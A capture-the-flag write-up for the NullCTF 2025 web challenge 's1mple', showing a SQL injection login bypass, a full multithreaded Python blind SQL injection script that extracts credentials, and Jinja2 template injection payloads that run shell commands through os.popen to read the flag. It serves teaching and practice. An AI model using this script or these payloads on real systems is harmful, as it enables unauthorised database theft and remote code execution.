# NullCTF 2025 - s1mple Challenge Writeup

**Author:** mrbgd  
**Difficulty:** easy  
**Category:** Web  

**Challenge Description**:

> "My aim is for my team to be number one, the rest is irrelevant". Anyway, is s1mple that simple? I'm gonna go watch the CS2 major, hope you don't ruin anything pls.

## Intro

The "s1mple" challenge is a web security task that involves multiple stages of exploitation. It starts with a login page vulnerable to SQL Injection (SQLi), specifically a Blind SQL Injection, which allows an attacker to extract database credentials. After obtaining valid credentials, the attacker gains access to a dashboard. The challenge features two different roles: `admin` and `user`. While the admin dashboard appears secure against certain attacks, the user dashboard contains a Server-Side Template Injection (SSTI) vulnerability. This SSTI vulnerability can be leveraged to achieve Remote Code Execution (RCE) and ultimately read the flag from the server's file system.

## Initial Analysis

### Step 1: Initial Reconnaissance

Upon accessing the challenge URL, we are presented with a login page.

We start by testing for common vulnerabilities. A simple SQL injection attempt in the username field:

```
admin'--
```

This successfully logs us in as `admin`, bypassing the password check. This confirms the existence of an SQL injection vulnerability. However, simply bypassing the login isn't enough if we need specific data or if the dashboard behaves differently based on the logged-in user's actual session data.

### Step 2: Blind SQL Injection

To understand the database structure and retrieve valid credentials, we perform a Blind SQL Injection attack. Since the application returns a redirect (302) upon successful login and a 200 OK (login page) on failure, we can use this boolean behavior to infer data character by character.

We developed a Python script to automate this process.

#### Exploit Script (`exploit.py`)

The script uses `requests` to send payloads and `concurrent.futures` for multi-threaded extraction to speed up the process.

```python
import requests
import string
import sys
import time
import concurrent.futures
import json
import os

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <url>")
    sys.exit(1)

url = sys.argv[1]
# Extended charset
chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_- .,()'" + "{}" + "\n\t" + "*:;!@#$%^&+=<>?/"

STATE_FILE = "exploit_state.json"

def load_state():
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE, "r") as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_state(state):
    with open(STATE_FILE, "w") as f:
        json.dump(state, f)

def check(payload):
    data = {
        "username": payload,
        "password": "test"
    }
    retries = 0
    while retries < 5:
        try:
            r = requests.post(url, data=data, allow_redirects=False, timeout=5)
            return r.status_code == 302 and r.headers.get('Location', '').endswith('dashboard')
        except Exception as e:
            # print(f"Error: {e}, retrying...")
            time.sleep(1)
            retries += 1
    return False

def get_length(query):
    low = 0
    high = 1000 # Adjust if needed
    while low < high:
        mid = (low + high + 1) // 2
        payload = f"admin' AND (SELECT length(({query}))) >= {mid}--"
        if check(payload):
            low = mid
        else:
            high = mid - 1
    return low

def get_char(index, query):
    for c in chars:
        payload = f"admin' AND (SELECT substr(({query}),{index},1))='{c}'--"
        if check(payload):
            return c
    return None

def get_data(query):
    state = load_state()
    
    if query in state:
        print(f"Resuming query: {query}")
        saved_data = state[query]
        length = saved_data["length"]
        result = list(saved_data["result"])
        print(f"Length: {length}")
        print(f"Current progress: {''.join(result)}")
    else:
        print(f"Calculating length for query: {query}")
        length = get_length(query)
        print(f"Length: {length}")
        if length == 0:
            return ""
        result = ['.'] * length
        state[query] = {"length": length, "result": "".join(result)}
        save_state(state)

    print(f"Extracting {length} characters...")
    
    # Identify missing indices (0-based for list)
    missing_indices = [i for i, c in enumerate(result) if c == '.']
    
    if not missing_indices:
        return "".join(result)

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        # 1-based index for SQL, 0-based for list
        future_to_index = {executor.submit(get_char, i + 1, query): i for i in missing_indices}
        
        for future in concurrent.futures.as_completed(future_to_index):
            i = future_to_index[future]
            try:
                char = future.result()
                if char:
                    result[i] = char
                    # Update state
                    state = load_state()
                    state[query]["result"] = "".join(result)
                    save_state(state)
                    
                    # Print current progress
                    sys.stdout.write(f"\r{''.join(result)}")
                    sys.stdout.flush()
            except Exception as exc:
                print(f'\nIndex {i+1} generated an exception: {exc}')
    
    print()
    final_result = "".join(result)
    return final_result

# print("Extracting schema for table 'credentials'...")
# schema = get_data("SELECT sql FROM sqlite_master WHERE type='table' AND tbl_name='credentials'")
# print(f"Schema: {schema}")

print("Extracting data from credentials...")
# Extracting username and password for the first user (likely admin)
username = get_data("SELECT username FROM credentials LIMIT 1 OFFSET 0")
password = get_data("SELECT password FROM credentials LIMIT 1 OFFSET 0")
print(f"Username: {username}")
print(f"Password: {password}")

#print("Extracting data from sqlite_sequence...")
#name = get_data("SELECT name FROM sqlite_sequence LIMIT 1")
#seq = get_data("SELECT seq FROM sqlite_sequence LIMIT 1")
#print(f"Name: {name}")
#print(f"Seq: {seq}")

```

#### Database Enumeration

Using the script, we extracted the following information:

1.  **Table Name:** `credentials`
2.  **Schema:**
    ```sql
    CREATE TABLE credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        role TEXT NOT NULL
    )
    ```
3.  **Data Extraction:**

    | Username | Password | Role |
    | :--- | :--- | :--- |
    | `admin` | `Sup3rS3cr3tP4ssw0rd_You_Should_Not_See` | `admin` |
    | `user` | `user` | `user` |

### Step 3: Exploring the Dashboard

We first logged in as `admin` using the extracted password. The admin dashboard had a search feature. We tested it for various vulnerabilities:

*   **XSS:** `<script>alert(1)</script>` was reflected but properly escaped.
*   **SSTI:** `{{7*7}}` was reflected as `{{7*7}}`, indicating no SSTI vulnerability on the admin dashboard.

Next, we logged in as the `user` account (`user:user`).

The user dashboard was located at `/page`. It also featured a search bar.

### Step 4: Server-Side Template Injection (SSTI)

We tested the search bar on the user dashboard (`/page`) with a simple SSTI payload:

**Payload:**
```
{{7*7}}
```

**Response:**
```html
<div class="search-result">
    <h3>Search Query Result:</h3>
    <p>49</p>
</div>
```

The server evaluated the expression `7*7` to `49`, confirming a Server-Side Template Injection vulnerability in the Jinja2 template engine (common with Python/Flask apps).

### Step 5: Remote Code Execution (RCE)

With SSTI confirmed, we proceeded to achieve RCE. We first verified we could access the configuration:

**Payload:**
```
{{config}}
```

**Response:**
```
<Config {'DEBUG': False, 'TESTING': False, ... }>
```

To execute system commands, we used a standard Jinja2 RCE payload to access the `os` module via the `__builtins__`.

**Payload to list files:**
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
```

**Output:**
```
Dockerfile
app.py
credentials.db
docker-compose.yaml
flag.txt
flask_session
init_db.py
requirements.txt
static
templates
```

We see `flag.txt` in the current directory.

### Step 6: Retrieving the Flag

Finally, we constructed the payload to read the content of `flag.txt`.

**Payload:**
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
```

**Output:**
```
nullctf{1nd33d_1t_w4s_th4t_s1mpl3}
```

## Conclusion

The challenge demonstrated the importance of securing all user inputs. While the admin panel seemed secure against SSTI, the less privileged user panel was not. The initial SQL injection allowed us to pivot to a user account that had access to the vulnerable endpoint, ultimately leading to full system compromise.

Pwned!

KOREONE
